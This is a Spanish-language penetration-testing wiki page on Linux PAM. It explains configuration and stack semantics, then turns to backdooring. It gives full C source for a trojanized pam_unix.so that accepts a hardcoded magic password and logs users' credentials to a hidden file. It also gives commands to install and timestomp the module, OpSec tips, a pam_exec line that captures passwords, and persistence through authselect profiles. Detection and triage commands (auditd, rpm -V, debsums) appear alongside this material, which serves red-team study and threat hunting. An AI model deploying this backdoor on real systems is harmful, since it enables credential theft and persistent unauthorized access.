# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Información básica

**PAM (Pluggable Authentication Modules)** actúa como un mecanismo de seguridad que **verifica la identidad de los usuarios que intentan acceder a servicios informáticos** y controla su acceso en función de diversos criterios. Es como un guardián digital que garantiza que solo los usuarios autorizados puedan utilizar servicios específicos y, potencialmente, limita su uso para evitar la sobrecarga del sistema.

#### Archivos de configuración

- **Solaris** admite el archivo central heredado `/etc/pam.conf`, pero las recomendaciones actuales prefieren los archivos de servicio ubicados en `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **Los sistemas Linux** prefieren un enfoque basado en directorios y almacenan las configuraciones específicas de cada servicio en `/etc/pam.d`. Por ejemplo, el archivo de configuración del servicio de inicio de sesión se encuentra en `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Un ejemplo de configuración de PAM para el servicio de inicio de sesión podría ser el siguiente:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Ámbitos de gestión de PAM**

Estos ámbitos, o grupos de gestión, incluyen **auth**, **account**, **password** y **session**, cada uno responsable de distintos aspectos del proceso de autenticación y gestión de sesiones:<sup>[[1]](#references)</sup>

- **Auth**: Valida la identidad del usuario, a menudo solicitando una contraseña.
- **Account**: Gestiona la verificación de cuentas, comprobando condiciones como la pertenencia a grupos o las restricciones horarias.
- **Password**: Gestiona las actualizaciones de contraseñas, incluidas las comprobaciones de complejidad y la prevención de ataques de diccionario.
- **Session**: Gestiona acciones al inicio o al final de una sesión de servicio, como montar directorios o establecer límites de recursos.

#### **Controles de módulos PAM**

Los controles determinan cómo responde el módulo ante el éxito o el fallo, lo que influye en el proceso de autenticación general. Incluyen:<sup>[[1]](#references)</sup>

- **Required**: Si falla un módulo requerido, el proceso acabará fallando, pero solo después de comprobar todos los módulos posteriores.
- **Requisite**: Termina el proceso inmediatamente si se produce un fallo.
- **Sufficient**: Si no ha fallado antes ningún módulo `required`, el éxito se devuelve de inmediato y se omiten los módulos restantes del mismo grupo de gestión.
- **Optional**: Solo provoca un fallo si es el único módulo de la pila.

#### Semántica ofensiva relevante

Al analizar o modificar PAM, la **ubicación de una regla insertada** determina qué pila la aplica:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` y `substack` incorporan reglas de otros archivos. Por eso, editar `sshd` podría afectar solo a SSH, mientras que editar `system-auth`, `common-auth` u otra pila compartida puede afectar a varios servicios a la vez.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM también admite controles entre corchetes, como `[success=1 default=ignore]`. Estos se pueden abusar para **omitir uno o más módulos** tras una comprobación personalizada satisfactoria, en lugar de sustituir visiblemente `pam_unix.so`.<sup>[[1]](#references)</sup>
- `module-path` puede ser **absoluta** (`/usr/lib/security/pam_custom.so`) o **relativa** al directorio predeterminado de módulos PAM. En sistemas Linux modernos, los directorios reales suelen ser `/lib/security`, `/lib64/security`, `/usr/lib/security` o rutas multiarch como `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

En resumen para el operador: antes de aplicar cambios, mapea siempre el **grafo completo de servicios**. Por ejemplo, `sshd -> password-auth -> system-auth` en algunas distribuciones, o `sshd -> system-remote-login -> system-login -> system-auth` en otras, significa que el mismo implant de una sola línea puede tener un alcance mucho mayor del previsto.<sup>[[1]](#references)[[13]](#references)</sup>

Un módulo `auth` personalizado puede añadir un desafío interactivo a `sudo` después de la contraseña de la cuenta. Antes de revisar manualmente el desafío, inspecciona la pila efectiva de `/etc/pam.d/sudo`, las políticas incluidas, los argumentos del módulo y los permisos de cualquier archivo de datos local al que se haga referencia. Una lista de palabras del desafío que se pueda leer no omite por sí sola la comprobación de la contraseña ni crea una autorización en sudoers. Para una transición privilegiada siguen siendo necesarias la autenticación correcta de la cuenta, la finalización de todos los pasos PAM requeridos y una regla de sudo capaz de conceder acceso root; la enumeración desatendida no debería activar el desafío.

Para la vulnerabilidad antigua de propiedad de `pam_motd` en Ubuntu ([CVE-2010-0832](https://ubuntu.com/security/cve-2010-0832)), revisa la compilación real de `libpam-modules` y si algún servicio de inicio de sesión invoca el módulo de sesión afectado. Ubuntu la corrigió en **1.1.0-2ubuntu1.1** para la versión 9.10 y en **1.1.1-2ubuntu5** para 10.04 LTS; otras versiones o backports del proveedor requieren evaluar sus propios paquetes. La ruta descrita requería que quien invocara el módulo sustituyera su `.cache` del directorio personal por un enlace simbólico y luego activara un inicio de sesión PAM, lo que hacía que el módulo antiguo cambiara la propiedad de un objetivo protegido. Una entrada `.cache`, una línea `pam_motd.so` o una versión antigua del kernel no demuestran por sí solas que el sistema esté expuesto; comprueba el control del directorio personal, la versión efectiva del módulo, la posibilidad de llegar al inicio de sesión, el manejo de enlaces simbólicos y los permisos del objetivo, sin sustituir archivos ni iniciar sesión durante la enumeración pasiva. Consulta el [aviso de seguridad de Ubuntu](https://ubuntu.com/security/notices/USN-959-1).

#### Ejemplo de escenario

En una configuración con varios módulos auth, el proceso sigue un orden estricto. Si el módulo `pam_securetty` determina que el terminal de inicio de sesión no está autorizado, se bloquean los inicios de sesión de root, pero se siguen procesando todos los módulos debido a su estado "required". `pam_env` establece variables de entorno que pueden mejorar la experiencia del usuario. Los módulos `pam_ldap` y `pam_unix` trabajan juntos para autenticar al usuario; `pam_unix` intenta usar una contraseña proporcionada anteriormente, lo que mejora la eficiencia y la flexibilidad de los métodos de autenticación.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` en una pila de servicio

`pam_permit.so` devuelve éxito en las comprobaciones PAM. Si un usuario con menos privilegios puede modificar la política PAM efectiva de un servicio, insertar este módulo con una marca de control que interrumpa la pila de autenticación puede eliminar la comprobación de contraseña para ese servicio. En el caso de `sudo`, inspecciona `/etc/pam.d/sudo` y cualquier archivo `common-auth` o `system-auth` incluido antes de decidir qué servicios están afectados. Omitir la autenticación PAM **no** concede una nueva regla de sudoers; el usuario aún debe estar autorizado para ejecutar el comando solicitado. Comprueba el orden de las reglas y si se han producido fallos previos de módulos `required`, en lugar de asumir que una sola línea `sufficient pam_permit.so` siempre tiene éxito.

## Backdooring PAM – Hooking `pam_unix.so`

Un truco clásico de persistencia en entornos Linux de alto valor consiste en **intercambiar la biblioteca PAM legítima por un drop-in troyanizado**. En un host cuya pila PAM carga `pam_unix.so`, la autenticación por SSH o consola puede invocar su punto de entrada `pam_sm_authenticate()`; un reemplazo malicioso puede capturar credenciales o implementar una omisión de contraseña *mágica*.<sup>[[2]](#references)[[11]](#references)</sup>

### Guía rápida de compilación
El esquema siguiente usa el punto de entrada de servicio `pam_sm_authenticate()` de Linux-PAM y `pam_get_authtok()` para acceder al token de autenticación.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Ejemplo de troyano `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Compila y realiza un reemplazo sigiloso (el patrón de reemplazo/timestomp está documentado por Unit 42). Ajusta tanto la ruta de respaldo codificada en el wrapper como los comandos de abajo al directorio real de módulos PAM del objetivo:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### Consejos de OpSec
1. **Sobrescritura atómica**: escribe una biblioteca completa en un archivo temporal y renómbralo para reemplazar el archivo original, evitando dejar un módulo de autenticación escrito parcialmente.
2. Se observó una ruta como `/usr/bin/.dbus.log` en el análisis de AuthDoor de Unit 42, por lo que también es un indicador útil para hunting.<sup>[[2]](#references)</sup>
3. Conserva los puntos de entrada que espera la pila PAM (por ejemplo, `pam_sm_authenticate` y `pam_sm_setcred`) para que otras operaciones de administración sigan funcionando.<sup>[[11]](#references)[[18]](#references)</sup>

### Detección
Para comprobar la integridad de los paquetes, RPM verifica los metadatos de los archivos instalados, `debsums -s` informa de errores de suma de comprobación y `dpkg -S`, en el bloque de triage, consulta la propiedad de los paquetes; la sintaxis de audit watch registra escrituras y cambios de atributos en una ruta.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Compara el MD5/SHA256 de `pam_unix.so` con el del paquete de la distribución.
* Usa `rpm -V pam` o `debsums -s libpam-modules` para detectar bibliotecas reemplazadas sin calcular hashes manualmente.
* Comprueba si hay permisos de escritura global o propietarios inusuales en `/lib/security/`.
* Regla de `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Busca módulos inesperados en las configuraciones de PAM: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Ese `grep` de `pam_` no detecta módulos personalizados con otros nombres base `.so`. Revisa las líneas **activas** de `auth`, `account`, `password` y `session` en `/etc/pam.d` (y en `/etc/pam.conf`, si se usa), incluidos su indicador de control y cualquier pila incluida. Un módulo desconocido ubicado como `auth sufficient` antes de la comprobación normal de contraseña merece una revisión de la propiedad del paquete y del binario; [la sintaxis de control de PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html) puede permitir que un resultado satisfactorio finalice anticipadamente esa parte de la pila. Un nombre de módulo, una marca de tiempo inusual o la opción `nodelay` por sí solos no demuestran que exista un bypass. Si el comportamiento sugiere un leak de temporización, inspecciona primero la implementación y la accesibilidad del servicio; la enumeración rutinaria no debería enviar repetidamente intentos de autenticación.

### Comandos de triage rápido (tras un compromiso o para threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Abuso de `pam_exec` para mantener la persistencia
En lugar de reemplazar `pam_unix.so`, una opción menos invasiva es agregar una línea `pam_exec` en `/etc/pam.d/sshd` para que una invocación que llegue a esa línea de PAM ejecute un helper, manteniendo intacta la pila normal.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` recibe metadatos de PAM en variables de entorno como `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` y `PAM_TYPE`. Con `expose_authtok`, el helper puede leer hasta `PAM_MAX_RESP_SIZE` bytes de la contraseña desde `stdin` durante las fases `auth` o `password`. Si quieres que el helper se ejecute con el UID efectivo en lugar del UID real, añade `seteuid`.<sup>[[4]](#references)</sup>

A continuación se indican algunas notas prácticas sobre los tipos de módulo y el filtro `type=` documentados para `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` es mejor para **acciones posteriores al inicio de sesión**, como volver a abrir sockets o iniciar un daemon desacoplado.
- `auth optional pam_exec.so quiet expose_authtok ...` suele ser la opción habitual para la **captura de credenciales**, porque se ejecuta antes de que se abra la sesión.
- Se puede usar `type=session` o `type=auth` para limitar la ejecución a una fase específica de PAM y evitar ejecuciones duplicadas innecesarias.

Al revisar privilegios, una ruta absoluta al helper `pam_exec.so` que el usuario actual pueda modificar es un posible candidato, incluso si el archivo está marcado como append-only (`a`): [el atributo permite añadir contenido](https://man7.org/linux/man-pages/man1/chattr.1.html), lo que podría bastar para alterar el comportamiento posterior de un script de shell. Primero confirma que el servicio y el evento de PAM realmente llegan a esa línea, que el helper y su ruta principal son de confianza, y que el comando se ejecuta con una identidad con más privilegios; [`seteuid` cambia qué UID de PAM se usa](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Un archivo modificable o el resultado de `lsattr` por sí solos no demuestran que la ejecución tenga privilegios.

### Persistencia frente a las herramientas de la distribución: `authselect`

En sistemas de la familia RHEL y Fedora que usan `authselect`, las modificaciones directas a archivos generados como `/etc/pam.d/system-auth` o `/etc/pam.d/password-auth` pueden ser **sobrescritas por `authselect`**. Para lograr persistencia, los administradores suelen modificar el perfil personalizado activo en `/etc/authselect/custom/<profile>/` y luego volver a seleccionarlo.<sup>[[5]](#references)[[19]](#references)</sup>

Flujo de trabajo habitual cuando tienes root:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Esto es importante tanto para la ofensiva como para el triaje: si `/etc/pam.d/system-auth` contiene el banner `Generated by authselect` y `Do not modify this file manually`, el verdadero punto de persistencia podría estar en `/etc/authselect/custom/` y no en `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Tradecraft reciente observado en la práctica

Un informe reciente de 2025 sobre la puerta trasera de Linux **Plague** mostró la misma idea central llevada más lejos: un componente PAM malicioso con una **contraseña de bypass estática**, además de la limpieza de variables de entorno relacionadas con SSH y del historial del shell (`HISTFILE=/dev/null`) para reducir los rastros de la sesión después del inicio de sesión.<sup>[[3]](#references)</sup> Este es un patrón de búsqueda útil porque la lógica de la puerta trasera puede estar en PAM, mientras que los artefactos de sigilo solo aparecen **después** de que la autenticación se realiza correctamente.


## References

- [1] [pam.conf(5) / pam.d(5) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [El manual del operador encubierto: infiltración de redes globales de telecomunicaciones - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: una puerta trasera para Linux basada en PAM descubierta recientemente](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Configuración de la autenticación de usuarios mediante authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Páginas de manual de Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Página del manual de Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Páginas de manual de Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Administración de la autenticación en Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Guía de autenticación a nivel de sistema - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Lista de archivos del paquete de Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Páginas de manual de Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Manual de Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Cambios/Convertir authselect en obligatorio - Wiki del proyecto Fedora](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
